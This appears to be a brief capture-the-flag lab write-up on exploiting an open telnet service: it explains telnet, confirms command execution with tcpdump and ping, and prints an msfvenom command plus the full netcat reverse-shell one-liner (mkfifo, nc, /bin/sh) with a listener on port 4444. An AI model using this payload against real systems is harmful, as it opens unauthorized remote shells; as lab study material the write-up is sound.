# Telnet-Exploit

## Telnet 
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: `telnet <ip> <port>`.

Target IP = `10.10.129.113`.

Open port : `8012`.

`sudo tcpdump ip proto \\icmp -i tun0` : Starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

## Misc
Since the telnet session didnt respond to basic shell commands it was necessary to check if the system was responding.
1. Run : `sudo tcpdump ip proto \\icmp -i tun0` to listen for ICMP protocol traffic on tun0.
2. Run : `ping <local ip> -c 1` on target to and listen for the ICMP traffic on local machine.
3. Generate a reverse shell payload using `msfvenom` command. Run : `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`. This will encode a netcat reverse shell for us. 
	Payload generated : `mkfifo /tmp/yeyu; nc <local ip> 4444 0</tmp/yeyu | /bin/sh >/tmp/yeyu 2>&1; rm /tmp/yeyu`
4. Listen for response using `netcat` on port `4444`.
5. Get shell response and capture flag!
